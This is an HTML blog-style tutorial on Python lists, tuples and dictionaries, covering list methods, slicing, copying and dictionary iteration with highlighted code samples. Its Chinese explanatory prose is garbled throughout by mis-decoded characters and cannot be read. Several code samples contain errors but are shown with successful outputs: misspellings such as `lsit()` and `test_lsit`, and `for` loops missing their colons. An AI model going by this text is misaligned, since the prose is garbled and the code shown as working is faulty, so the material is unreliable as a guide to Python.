<p><strong>tips</strong>:å…ƒç´ å¯ä»¥æ˜¯ä»»æ„çš„pyå¯¹è±¡ï¼Œå¯ä»¥æ˜¯å˜é‡ï¼Œæˆ–è€…æ˜¯æ–°çš„åˆ—è¡¨å’Œå…ƒç»„(å§‘ä¸”ç§°ä¹‹ä¸ºåµŒå¥—ï¼Œæ— ç»Ÿä¸€å«æ³•ï¼Œå«å¥—å¨ƒä¹Ÿè¡Œï¼Ÿ)</p>
</li>
<li><p>åˆ©ç”¨<code>list()</code>æ–¹æ³•åˆ›å»ºä¸€ä¸ªç©ºåˆ—è¡¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">another_empty_list = lsit()</span><br><span class="line"><span class="built_in">print</span>(another_empty_list)</span><br><span class="line"><span class="comment">#out:[]  #è¡¨ç¤ºæ‰“å°äº†ä¸€ä¸ªç©ºæ•°ç»„ ï¼Œåˆ—è¡¨å¯ä»¥ç›´æ¥æ‰“å°</span></span><br></pre></td></tr></table></figure>

<p>list()ä¸ä»…åªæœ‰è¿™äº›åŠŸèƒ½ï¼Œ(å§‹ç»ˆè®°ä½pyä¸­è¡¨ç¤ºå­—ç¬¦ä¸²å•åŒå¼•å·å‡å¯ï¼Œä¹ æƒ¯å•å¼•å·)listå‡½æ•°å‚æ•°æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°†ä¸€ä¸ªè‹±æ–‡å•è¯è½¬åŒ–ä¸ºåˆ—è¡¨</span></span><br><span class="line">list_cat = <span class="built_in">list</span>(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (lsit_cat) <span class="comment">#outsï¼š[&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†ä¸€ä¸ªå…ƒç»„è½¬åŒ–ä¸ºåˆ—è¡¨</span></span><br><span class="line">alphabet = (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>(alphabet))<span class="comment">#outs:[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p>ç”±äºåˆ—è¡¨ä¸­åŒ…å«å„ç§å…ƒç´ çµæ´»ç‰¹æ€§ï¼ˆè§ä¸Šä¸€ä¸ªtipsï¼‰æ‰€ä»¥ä¸€äº›çœ‹èµ·æ¥å¾ˆå¥‡æ€ªçš„å¥—å¨ƒä¹Ÿæ˜¯å¯ä»¥é€šè¿‡ç¼–è¯‘çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">element = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">a_tuple = (<span class="string">&#x27;hey&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">example = [<span class="string">&quot;e1&quot;</span>,<span class="string">&quot;e2&quot;</span>,<span class="number">2</span>,element,a_tuple]</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="comment">#outs: [&#x27;e1&#x27;, &#x27;e2&#x27;, 2, &#x27;a&#x27;, (&#x27;hey&#x27;,&#x27;hello&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ä¸ºäº†ä¸è®©è‡ªå·±é€»è¾‘æ··ä¹±å°½é‡å°‘ç”¨å¥—å¨ƒ</p>
<h4 id="åˆ—è¡¨çš„æ–¹æ³•"><a href="#åˆ—è¡¨çš„æ–¹æ³•" class="headerlink" title="åˆ—è¡¨çš„æ–¹æ³•"></a>åˆ—è¡¨çš„æ–¹æ³•</h4><ul>
<li><p><strong>ä¿®æ”¹å€¼</strong> <code>åˆ—è¡¨å[0] = &#39;å…ƒç´ 0&#39;</code>,è¿™æ ·åŸåˆ—è¡¨ä¸­çš„â€œå…ƒç´ 1â€å°±è¢«ä¿®æ”¹æˆäº†â€œå…ƒç´ 0â€</p>
</li>
<li><p><strong>æ·»åŠ å…ƒç´ </strong> åˆ©ç”¨æ–¹æ³• <code>append ()</code></p>
<p><code>åˆ—è¡¨å.append(&#39;å…ƒç´ 5&#39;)</code>,è¿™æ¡ä»£ç ä¼šåœ¨åˆ—è¡¨æœ«å°¾åŠ ä¸€ä¸ªâ€œå…ƒç´ 5â€</p>
<p>æ­¤æ–¹æ³•å‚æ•°å¯ä»¥å¡«å¦ä¸€ä¸ªåˆ—è¡¨ç”šè‡³å…ƒç»„</p>
</li>
<li><p><strong>æ‰¹é‡æ·»åŠ å…ƒç´ </strong> åˆ©ç”¨æ–¹æ³•<code>extend()</code>æˆ–è€…<code>+=</code>(æ¨èï¼Œç±»cè¯­æ³•)</p>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">family = [<span class="string">&#x27;mother&#x27;</span>,<span class="string">&#x27;father&#x27;</span>]</span><br><span class="line">ext_family = [<span class="string">&#x27;me&#x27;</span>]</span><br><span class="line">family += ext_family</span><br><span class="line"><span class="built_in">print</span>(family)</span><br><span class="line"><span class="comment">#outs: [&#x27;mother&#x27;, &#x27;father&#x27;, &#x27;me&#x27;]</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>æ’å…¥å…ƒç´ </strong> åˆ©ç”¨æ–¹æ³• <code>insert()</code></p>
<p><code>åˆ—è¡¨å.insert(0,&#39;å…ƒç´ 0&#39;)</code>ï¼Œè¿™æ¡ä»£ç ä¼šåœ¨åŸæœ¬â€œå…ƒç´ 1â€çš„ä½ç½®æ’å…¥ä¸€ä¸ªâ€å…ƒç´ 0â€ï¼Œä¸”æ­¤åçš„æ¯ä¸€ä¸ªå…ƒç´ å³ç§»ä¸€ä¸ªä½ç½®</p>
</li>
<li><p><strong>åˆ é™¤å…ƒç´ </strong> </p>
<p> <code>del åˆ—è¡¨å[0]</code>è¿™æ ·å°±åˆ é™¤äº†åŸåˆ—è¡¨ä¸­çš„â€œå…ƒç´ 1â€ï¼Œä¸å¯ä»¥ç»§ç»­ä½¿ç”¨ä»–çš„å€¼</p>
<p> <code>åˆ—è¡¨å.pop()</code> popä¼šåˆ é™¤åˆ—è¡¨æœ«å°¾çš„å…ƒç´ ï¼Œæ¦‚å¿µæ¥è‡ªäºæ ˆï¼Œå¼¹å‡ºæœ€åä¸€ä¸ªï¼Œæ­¤æ—¶å¯å°†å¼¹å‡ºçš„å…ƒç´ å­˜å‚¨åœ¨ä¸€ä¸ªå˜é‡ä¸­ï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨ä»–çš„å€¼</p>
<p> <code>åˆ—è¡¨å .remove(&#39;å…ƒç´ 0&#39;)</code>ï¼Œæ ¹æ®å…ƒç´ å€¼è¿›è¡Œåˆ é™¤ï¼Œè‹¥å­˜å‚¨åœ¨ä¸€ä¸ªå˜é‡ä¸­ï¼Œä¹Ÿå¯ä»¥ç»§ç»­ä½¿ç”¨ä»–çš„å€¼</p>
</li>
<li><p><strong>ç»„ç»‡åˆ—è¡¨ï¼ˆæ’åºï¼‰</strong></p>
<p> <code>åˆ—è¡¨å.sort()</code>         å¯ä»¥æ ¹æ®é¦–å­—æ¯é¡ºåºæ’åº</p>
<p> ä¸Šè¿°sortæ–¹æ³•ä¸­æ‹¬å·å†…å¯ä»¥åŠ å…¥å‚æ•° <code>reverse = True</code>å­—æ¯å€’åºæ’åº</p>
<p> sortå¯¹å…ƒç´ çš„é¡ºåºä¿®æ”¹æ—¶æ°¸ä¹…çš„</p>
<p> <code>sorted()</code>å‡½æ•°ç”¨äºä¸´æ—¶æ’åºä¸å½±å“åˆ—è¡¨ä¸­çš„åŸå§‹æ’åº</p>
<p> ä¹Ÿå¯ä»¥ä½¿ç”¨<code>reverse = True</code> æ¥å®ç°å­—æ¯å€’åº</p>
</li>
<li><p><strong>å€’ç€æ‰“å°åˆ—è¡¨</strong></p>
<p>  åˆ©ç”¨æ–¹æ³•<code>reverse()</code>ï¼Œæ˜¯æ°¸ä¹…æ€§ä¿®æ”¹é¡ºåº</p>
<p>  é¡ºä¾¿ä¸€æï¼Œåˆ‡ç‰‡çš„æ–¹æ³•ä¾æ—§å¯ä»¥åœ¨åˆ—è¡¨å½“ä¸­ä½¿ç”¨ï¼Œæ¯”å¦‚é€†åºåˆ—è¡¨å¯ä»¥å·§å¦™åœ°ä½¿ç”¨<code>list_name[::-1]</code></p>
</li>
</ul>
<p>â€‹        åˆ©ç”¨å‡½æ•°<code>len()</code>å¯ä»¥å¿«é€Ÿå¾—åˆ°åˆ—è¡¨çš„é•¿åº¦ï¼Œpsï¼špyè®¡ç®—åˆ—è¡¨å…ƒç´ æ•°æ˜¯ä»1å¼€å§‹ç®—èµ·ï¼Œä¸ç”¨è€ƒè™‘0çš„è®¡æ•°</p>
<ul>
<li><p><strong>è·å–å…ƒç´ åœ¨åˆ—è¡¨ä¸­çš„ä½ç½®</strong></p>
<p>â€‹    ä½¿ç”¨æ–¹æ³•<code>index()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">test.index(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#outs: 0</span></span><br><span class="line">test.index(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment">#outs: 1</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>inåˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨åˆ—è¡¨ä¸­</strong></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> test)</span><br><span class="line"><span class="comment">#outs: True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;atuoa&#x27;</span> <span class="keyword">in</span> test)</span><br><span class="line"><span class="comment">#outs: False</span></span><br><span class="line"><span class="comment">#è¿”å›å€¼ä¸ºé€»è¾‘çœŸå‡	</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>ä½¿ç”¨æ–¹æ³•<code>count()</code>ç»Ÿè®¡å…ƒç´ åœ¨åˆ—è¡¨ä¸­å‡ºç°æ¬¡æ•°</strong> </p>
<p>usageï¼š<code>list_name.count(&#39;element&#39;)</code></p>
</li>
<li><p><strong>ä½¿ç”¨<code>join()</code>è½¬æ¢ä¸ºå­—ç¬¦ä¸²</strong></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(test))</span><br><span class="line"><span class="comment">#outs:a,b,c</span></span><br></pre></td></tr></table></figure>

<h5 id="éå†åˆ—è¡¨"><a href="#éå†åˆ—è¡¨" class="headerlink" title="éå†åˆ—è¡¨"></a>éå†åˆ—è¡¨</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">magicians = [ <span class="string">&#x27;alince&#x27;</span> , <span class="string">&#x27;david&#x27;</span> , <span class="string">&#x27;carolina&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magicians :</span><br><span class="line">    <span class="built_in">print</span>(magician)</span><br></pre></td></tr></table></figure>

<p>æ”¹æ®µä»£ç ç¤ºä¾‹ä¸­ç”¨äº†forå¾ªç¯ï¼Œmagicianæ˜¯ä¸€ä¸ªå˜é‡ï¼Œmagiciansæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå¯ä»¥ç”¨å˜é‡æ¥éå†æ•´ä¸ªåˆ—è¡¨</p>
<p><em><strong>ä¸è¦å¿˜è®°å†’å·ï¼Œè¡¨ç¤ºä¸‹ä¸€è¡Œæ˜¯å¾ªç¯çš„ç¬¬ä¸€è¡Œ</strong></em></p>
<p><em><strong>pythonè¦æ±‚å¼ºåˆ¶ç¼©è¿›ï¼Œæ³¨æ„ç¼©è¿›å¯èƒ½å¼•å‘çš„é—®é¢˜</strong></em></p>
<hr>
<h5 id="æ•°å€¼åˆ—è¡¨"><a href="#æ•°å€¼åˆ—è¡¨" class="headerlink" title="æ•°å€¼åˆ—è¡¨"></a>æ•°å€¼åˆ—è¡¨</h5><ul>
<li>å‡½æ•°rangeç”Ÿæˆæ•°å­—</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>) <span class="comment">#[1,6)</span></span><br><span class="line">	<span class="built_in">print</span>(value)</span><br><span class="line"> <span class="comment">#outs:1,2,3,4,5</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºæ•°å­—1-5ï¼Œ6å–ä¸åˆ°</p>
<p>range å¯ä»¥æŒ‡å®šæ­¥é•¿ ä¾‹å¦‚range(2,11,2)</p>
<p>åˆ™æ˜¯è¯¥å‡½æ•°ä»2è‡³11æ­¥é•¿ä¸º2 </p>
<ul>
<li><p>ä½¿ç”¨list()å‡½æ•°æ¥åˆ›å»ºæ•°å­—åˆ—è¡¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numbers = <span class="built_in">list</span> (<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span> (numbers)</span><br><span class="line"><span class="comment">#outsï¼š[1,2,3,4,5]</span></span><br></pre></td></tr></table></figure></li>
<li><p>å¯¹æ•°å€¼åˆ—è¡¨çš„ç®€å•ç»Ÿè®¡è®¡ç®—</p>
<p>max(),min(),sum()ä¸‰ä¸ªå†…å»ºå‡½æ•°</p>
<p>usage:<code>sum(list_name)</code></p>
</li>
<li><p>åˆ—è¡¨è§£æ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ—è¡¨å  è¡¨è¾¾å¼ï¼ˆrangeçš„ï¼‰ å˜é‡      èŒƒå›´      </span></span><br><span class="line">squares = [value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br><span class="line"><span class="comment">#outs:[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‡å°‘ä»£ç è¡Œæ•°</p>
</li>
<li><p>å°†å­—ç¬¦ä¸²åˆ—è¡¨è½¬æ¢ä¸ºæ•°å€¼åˆ—è¡¨</p>
</li>
</ul>
<p>mapå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ¥å—æ•°å€¼è½¬æ¢çš„ç±»å‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¾…è½¬çš„å­—ç¬¦ä¸²ï¼›ä½†æ˜¯mapå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€æ®µå†…å­˜ç©ºé—´ï¼Œä¸èƒ½ç›´æ¥æ‰“å°è¿˜éœ€è¦ç”¨listå‡½æ•°è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œè¿™æ ·å°±å˜æˆæ•°å€¼å‡½æ•°äº†</p>
<p>å…³äºæ•°å€¼åˆ—è¡¨ä¸å­—ç¬¦ä¸²åˆ—è¡¨çš„ç›¸äº’è½¬æ¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_list convert string_list</span></span><br><span class="line">number_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">str_list = []</span><br><span class="line"><span class="keyword">for</span> ele <span class="keyword">in</span> number_list:</span><br><span class="line">    str_list.append(<span class="built_in">str</span>(ele))</span><br><span class="line"><span class="built_in">print</span>(str_list)</span><br><span class="line"><span class="comment">#outs:[&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#number_list convert string_list</span></span><br><span class="line">str_list = [<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>]</span><br><span class="line">number_list = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,str_list))</span><br><span class="line"><span class="built_in">print</span>(number_list)</span><br><span class="line"><span class="comment">#outs:[4,5,6]</span></span><br></pre></td></tr></table></figure>



<h5 id="åˆ‡ç‰‡"><a href="#åˆ‡ç‰‡" class="headerlink" title="åˆ‡ç‰‡"></a>åˆ‡ç‰‡</h5><p><strong>ä½œç”¨</strong> ï¼šè¾“å‡ºéƒ¨åˆ†åˆ—è¡¨</p>
<p>ä¸rangeæ–¹æ³•ç›¸åŒï¼Œåˆ‡ç‰‡çš„[0:3]è¡¨ç¤ºä¹Ÿæ˜¯0ï¼Œ1ï¼Œ2ä¸‰ä¸ªå…ƒç´ ï¼Œä¸åŒ…æ‹¬3ï¼Œå³<code>[0,3)</code></p>
<p>åˆ‡ç‰‡å¯ä»¥ç¼ºçœ[:3]å°±æ˜¯è¡¨ç¤ºä»åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹</p>
<p>å¯ä»¥ç”¨è´Ÿæ•°ä½œä¸ºç´¢å¼•ï¼Œä¾‹å¦‚[-3:]å°±æ˜¯æŒ‡è¯¥åˆ—è¡¨çš„æœ€åä¸‰ä¸ªå…ƒç´ </p>
<ul>
<li><p><strong>éå†åˆ‡ç‰‡</strong></p>
<p>ä»…å°†forå¾ªç¯ä¸­çš„åˆ—è¡¨æ¢æˆåˆ‡ç‰‡å³å¯å®ç°ä¾‹å¦‚</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># çœç•¥åˆ—è¡¨çš„å®šä¹‰ #è¯¥æ®µç¨‹åºçœç•¥äº†ç©å®¶åå­—ï¼Œæ•ˆæœå°±æ˜¯åå­—é¦–å­—æ¯å¤§å†™è¾“å‡º</span></span><br><span class="line"><span class="keyword">for</span> player <span class="keyword">in</span> players[:<span class="number">3</span>]</span><br><span class="line">	<span class="built_in">print</span>(player.title() )</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>å¤åˆ¶åˆ—è¡¨</strong></li>
</ul>
<ol>
<li>ä½¿ç”¨<code>.copy()</code>æ–¹æ³•</li>
<li><code>list()</code>è½¬æ¢å‡½æ•°</li>
<li>åˆ—è¡¨åˆ†ç‰‡æ³•<code>copy_list = list_name[:]</code></li>
</ol>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¤åˆ¶åˆ—è¡¨å¹¶ä¸å¯ä»¥ç›´æ¥ç”¨<code>åˆ—è¡¨å = åˆ—è¡¨å</code>çš„å½¢å¼ï¼Œä¼šå¯¼è‡´ä¸¤ä¸ªå˜é‡åéƒ½æŒ‡å‘ä¸€ä¸ªåˆ—è¡¨çš„æƒ…å†µï¼Œä¸€èˆ¬ä½¿ç”¨ç¼ºçœçš„åˆ‡ç‰‡æ¥å®ç°å¤åˆ¶åˆ—è¡¨æ“ä½œä¾‹å¦‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_list = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">copy_list = test_list.copy() <span class="comment">#.copy()æ–¹æ³•å®ç°</span></span><br><span class="line">copy_lsit = <span class="built_in">list</span>(test_lsit) <span class="comment">#listè½¬æ¢å‡½æ•°</span></span><br><span class="line">copy_list = test_list[:]  <span class="comment">#åˆ—è¡¨åˆ†ç‰‡æ³•å®ç°</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥å®ç°å¤åˆ¶åˆ—è¡¨çš„æ“ä½œï¼Œè‹¥ç›´æ¥ç”¨åˆ—è¡¨å=åˆ—è¡¨åçš„å½¢å¼ <code>copy_list = test_list</code>,å°±ä¼šå¯¼è‡´ä¸¤ä¸ªåˆ—è¡¨å˜é‡æŒ‡å‘åŒä¸€ä¸ªåˆ—è¡¨çš„æƒ…å†µï¼Œæœ‰ç‚¹ç±»ä¼¼cç³»è¯­è¨€ä¸­ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå†…å­˜åŒºåŸŸ</p>
<h3 id="å…ƒç»„ï¼ˆtupleï¼‰"><a href="#å…ƒç»„ï¼ˆtupleï¼‰" class="headerlink" title="å…ƒç»„ï¼ˆtupleï¼‰"></a>å…ƒç»„ï¼ˆtupleï¼‰</h3><p>ä¸åˆ—è¡¨ä¸åŒï¼Œå…ƒç»„æ— æ³•æ”¹å˜å…ƒç´ çš„å€¼ï¼Œç”¨å°æ‹¬å¼§â€œï¼ˆâ€â€œï¼‰â€å¼•èµ·çš„ï¼Œå…ˆä»å»ºç«‹ä¸€ä¸ªå…ƒç»„å¼€å§‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">empty_tuple = ()</span><br><span class="line"><span class="built_in">print</span>(empty_tuple)</span><br><span class="line"><span class="comment">#outs: ()</span></span><br></pre></td></tr></table></figure>

<p>å»ºç«‹ä¸€ä¸ªéç©ºå…ƒç»„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = (<span class="number">1</span>,<span class="number">3</span>) <span class="comment">#å®šä¹‰å…ƒç»„æ—¶å¯ä»¥å»æ‰æ‹¬å·ï¼Œä½†åŠ ä¸Šæ‹¬å·è¯­æ³•æ›´æ¸…æ™°</span></span><br><span class="line"><span class="built_in">print</span>(test[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#outsï¼š1</span></span><br><span class="line">a,b = test <span class="comment">#å°†å…ƒç»„åˆ†ç»™å¤šä¸ªå˜é‡ï¼Œè¯¥è¿‡ç¨‹ç§°ä¸ºå…ƒç»„è§£åŒ…</span></span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line"><span class="comment">#outs: 1 3</span></span><br></pre></td></tr></table></figure>

<p>è¯­æ³•ä¸åˆ—è¡¨åŸºæœ¬ç›¸åŒï¼Œå°‘äº†å¾ˆå¤šæ–¹æ³•ï¼Œä¸åˆ—è¡¨<code>list()</code>ç›¸å¯¹çš„æ–¹æ³•,å…ƒç»„æœ‰<code>tuple()</code>ä½œç”¨æ˜¯å°†å…¶ä»–ç±»å‹è½¬æ¢ä¸ºå…ƒç»„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">family = [<span class="string">&#x27;monther&#x27;</span>,<span class="string">&#x27;father&#x27;</span>,<span class="string">&#x27;me&#x27;</span>]</span><br><span class="line">tuple_family = <span class="built_in">tuple</span>(family)</span><br><span class="line"><span class="built_in">print</span>(tuple_family)</span><br><span class="line"><span class="comment">#outs:(&#x27;monther&#x27;, &#x27;father&#x27;, &#x27;me&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>é‡è¦ç‰¹æ€§ï¼š</p>
<p>å…ƒç»„<strong>æ— æ³•æ›´æ”¹å…ƒç´ </strong> ï¼Œä½†æ˜¯å¯ä»¥æ›´æ”¹æ•´ä¸ªå…ƒç»„å˜é‡ï¼Œä¾‹å¦‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = (<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> test:</span><br><span class="line">    <span class="built_in">print</span> (t)</span><br><span class="line">test = (<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> test:</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸­ï¼Œå…ƒç»„ä½¿ç”¨çš„ç›¸å¯¹è¾ƒå°‘ï¼Œä»¥ä¸‹æ˜¯å…ƒç»„çš„ä¸€äº›ä¼˜ç‚¹;</p>
<ul>
<li>å ç”¨å†…å­˜å°</li>
<li>å€¼ä¸ä¼šè¢«æ„å¤–ç¯¡æ”¹</li>
<li>å¯ä»¥ä½œä¸ºå­—å…¸çš„é”®</li>
<li>å‡½æ•°çš„å‚æ•°æ˜¯ä»¥å…ƒç»„çš„å½¢å¼ä¼ é€’çš„</li>
<li>å‘½åå…ƒç»„(named tuple)å¯ä»¥ä½œä¸ºå¯¹è±¡æ›¿ä»£ï¼ˆä¸‹æ–‡ç±»ä¸­æåˆ°ï¼‰</li>
</ul>
<h3 id="å­—å…¸ï¼ˆdictionaryï¼‰"><a href="#å­—å…¸ï¼ˆdictionaryï¼‰" class="headerlink" title="å­—å…¸ï¼ˆdictionaryï¼‰"></a>å­—å…¸ï¼ˆdictionaryï¼‰</h3><h4 id="åˆ›å»ºä¸€ä¸ªå­—å…¸"><a href="#åˆ›å»ºä¸€ä¸ªå­—å…¸" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå­—å…¸"></a>åˆ›å»ºä¸€ä¸ªå­—å…¸</h4><p>å­—å…¸ç”¨äºå­˜å‚¨ä¸€ä¸ªé”®å€¼å¯¹åº”ç±»å‹ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œä»åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸å¼€å§‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">empty_dictionary = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(empty_dictionary)</span><br><span class="line"><span class="comment">#outs:&#123;&#125;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (alien_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> (alien_0[<span class="string">&#x27;points&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>å­—å…¸â€œé”®-å€¼â€å¯¹åº”ï¼Œæ¯ä¸€ç»„ä¹‹ç”¨é€—å·éš”å¼€</p>
<p>æ›´æ”¹å­—å…¸çš„å€¼<code>alien_0[&#39;color&#39;]= &#39;yellow&#39;  </code></p>
<p>åˆ é”®åªéœ€è¦é”®æœ¬èº«<code>del alien_0 [&#39;color&#39;]</code>å¦‚æ­¤ä¾¿ä¼šåˆ é™¤colorçš„å€¼</p>
<h4 id="éå†å­—å…¸"><a href="#éå†å­—å…¸" class="headerlink" title="éå†å­—å…¸"></a>éå†å­—å…¸</h4><p>åˆ©ç”¨forå¾ªç¯æ¥éå†å­—å…¸æ“ä½œï¼Œäº‹å…ˆåŠ äº†ä¸€ç‚¹forå¾ªç¯ï¼Œåº”è¯¥å¯ä»¥ç†è§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_0 = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;efermi&#x27;</span>, <span class="comment">#key : value</span></span><br><span class="line">    <span class="string">&#x27;first&#x27;</span> : <span class="string">&#x27;enrico&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span> : <span class="string">&#x27;fermi&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;\nkey: &quot;</span> + key)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;value: &quot;</span> + value)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;key: username #å¤šè¡Œæ³¨é‡Šï¼Œè¾“å‡ºæ— ä¸‰ä¸ªå•å¼•</span></span><br><span class="line"><span class="string">value: efermi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key: first</span></span><br><span class="line"><span class="string">value: enrico</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key: last</span></span><br><span class="line"><span class="string">value: fermi&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>items()</code>æ–¹æ³•æ˜¯å°†é”®å’Œå€¼å–å‡ºçš„æ–¹æ³•ï¼ŒåŒæ ·çš„ï¼Œä»…éœ€è¦å€¼ï¼ˆvaluesï¼‰å¯ä»¥ç”¨æ–¹æ³•<code>values()</code>,è¿”å›å€¼æ˜¯åˆ—è¡¨ï¼ˆ<code>dict_keys()</code>éå®Œæ•´åˆ—è¡¨ï¼‰</p>
<h4 id="æ·»åŠ æˆ–ä¿®æ”¹å…ƒç´ "><a href="#æ·»åŠ æˆ–ä¿®æ”¹å…ƒç´ " class="headerlink" title="æ·»åŠ æˆ–ä¿®æ”¹å…ƒç´ "></a>æ·»åŠ æˆ–ä¿®æ”¹å…ƒç´ </h4><p>ä¸åˆ—è¡¨ä¸åŒçš„æ˜¯ï¼Œå­—å…¸æ²¡æœ‰é‚£ä¹ˆå¤šçš„æ–¹æ³•ç”¨äºæ·»åŠ å’Œä¿®æ”¹å…ƒç´ ï¼Œè€Œæ˜¯æä¾›ä¸€ä¸ªæ›´ç®€æ´çš„è¯­æ³•,ä¾‹å­å¦‚ä¸‹</p>
